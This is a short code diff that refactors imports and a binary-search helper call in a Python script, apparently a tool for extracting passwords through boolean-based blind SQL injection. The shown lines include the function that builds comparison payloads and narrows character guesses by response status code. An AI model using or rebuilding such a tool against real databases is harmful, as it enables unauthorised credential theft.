@@ -1,9 +1,11 @@
-from src.sql_function import sending_payload_for_boolean_based_SQLi
 import sys
+
 from colorama import Fore, Style
-from src.info_message import output_message, warning_message, successful_message
-from src.binary_search import  binary_search_coderr
+
+from src.binary_search import  * 
 from src.info_message import welcome_message
+from src.sql_function import sending_payload_for_boolean_based_SQLi
+from src.info_message import output_message, warning_message, successful_message
 
 
 
@@ -54,7 +56,7 @@ def get_password_with_boolean_based_SQLi():
                 indice +=1
                 break
             
-            high_bound,low_bound,mid_point = binary_search_coderr(status_code, operator1, high_bound, low_bound, mid_point)     
+            high_bound,low_bound,mid_point = BinarySearch.binary_search_coderr(status_code, operator1, high_bound, low_bound, mid_point)     
             mid_point = (low_bound+high_bound)//2
             payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
             payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
